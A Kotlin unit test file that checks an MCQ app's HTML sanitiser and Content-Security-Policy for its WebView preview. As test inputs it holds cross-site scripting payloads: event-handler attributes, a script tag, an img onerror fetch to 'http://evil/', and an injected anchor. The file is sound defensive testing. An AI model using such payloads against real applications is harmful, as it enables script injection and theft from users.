package com.mcqapp

import com.mcqapp.data.renderInlineHtml
import com.mcqapp.domain.ContentElement
import com.mcqapp.util.mixedContentHtml
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

/**
 * The in-app preview is a JavaScript-enabled WebView, and its text runs come
 * from imported question banks. Anything executable in a text run would run
 * inside the app's own chrome, so the renderers re-emit allow-listed tags and
 * escape everything else.
 */
class RichTextSanitizingTest {

    private fun preview(vararg elements: ContentElement): String =
        mixedContentHtml(elements.toList(), 16f, "rgba(0,0,0,1)")

    @Test
    fun eventHandlerAttributesAreDropped() {
        assertEquals("<b>bold</b>", renderInlineHtml("<b onclick=\"steal()\">bold</b>"))
        assertEquals("<b>bold</b>", renderInlineHtml("<b ONMOUSEOVER=alert(1)>bold</b>"))
    }

    @Test
    fun styleAttributesAreDropped() {
        assertEquals("<div>x</div>", renderInlineHtml("<div style=\"position:fixed\">x</div>"))
    }

    @Test
    fun allowedFormattingSurvives() {
        assertEquals("H<sub>2</sub>O", renderInlineHtml("H<sub>2</sub>O"))
        assertEquals("a<br/>b", renderInlineHtml("a<br>b"))
        assertEquals("a<br/>b", renderInlineHtml("a<br/>b"))
        assertEquals("<strong>x</strong>", renderInlineHtml("<strong>x</strong>"))
        assertEquals("<s>x</s>", renderInlineHtml("<strike>x</strike>"))
    }

    @Test
    fun unknownTagsStayVisibleAsText() {
        assertEquals("&lt;foo&gt;y&lt;/foo&gt;", renderInlineHtml("<foo>y</foo>"))
    }

    @Test
    fun scriptTagsAreEscapedInThePreview() {
        val html = preview(
            ContentElement.TextElement("q"),
            ContentElement.MathElement("<math><mi>x</mi></math>")
        )
        val payload = "<script>alert(1)</script>"
        val html2 = preview(
            ContentElement.TextElement(payload),
            ContentElement.MathElement("<math><mi>x</mi></math>")
        )
        assertFalse("raw <script> must never reach the page", html2.contains("<script>alert"))
        assertTrue(html2.contains("&lt;script&gt;"))
        assertTrue(html.contains("<math>"))
    }

    @Test
    fun injectedImageHandlersCannotFireInThePreview() {
        val html = preview(
            ContentElement.TextElement("<img src=x onerror=\"fetch('http://evil/')\">"),
            ContentElement.MathElement("<math><mi>x</mi></math>")
        )
        // The payload survives as visible escaped text — "onerror" appearing
        // in the source is fine. What must not survive is a real tag.
        assertFalse(html.contains("<img"))
        assertTrue(html.contains("&lt;img"))
    }

    @Test
    fun anAnchorCannotBeInjectedIntoThePreview() {
        val html = preview(
            ContentElement.TextElement("<a href=\"http://evil/\">click</a>"),
            ContentElement.MathElement("<math><mi>x</mi></math>")
        )
        assertFalse(html.contains("<a href"))
        assertTrue(html.contains("&lt;a href"))
    }

    @Test
    fun formattingIsStillRenderedInThePreview() {
        val html = preview(
            ContentElement.TextElement("H<sub>2</sub>O"),
            ContentElement.MathElement("<math><mi>x</mi></math>")
        )
        assertTrue(html.contains("H<sub>2</sub>O"))
    }

    @Test
    fun thePageDeclaresAContentSecurityPolicy() {
        val html = preview(
            ContentElement.TextElement("q"),
            ContentElement.MathElement("<math><mi>x</mi></math>")
        )
        // Defence in depth: even if markup slipped through, the page may not
        // reach the network or run inline event handlers.
        assertTrue(html.contains("Content-Security-Policy"))
        assertTrue(html.contains("default-src 'none'"))
        // The policy mirrors what the WebView can load: data-URI images only
        // (allowFileAccess=false rules out real files, and the page has no
        // file: image or stylesheet), while script-src keeps file: for the
        // bundled MathJax asset — the same containment the exports ship.
        assertTrue(html.contains("img-src data:"))
        assertFalse(html.contains("img-src data: file:"))
        assertFalse(html.contains("style-src 'unsafe-inline' file:"))
        assertTrue(html.contains("script-src 'unsafe-inline' file:"))
    }
}
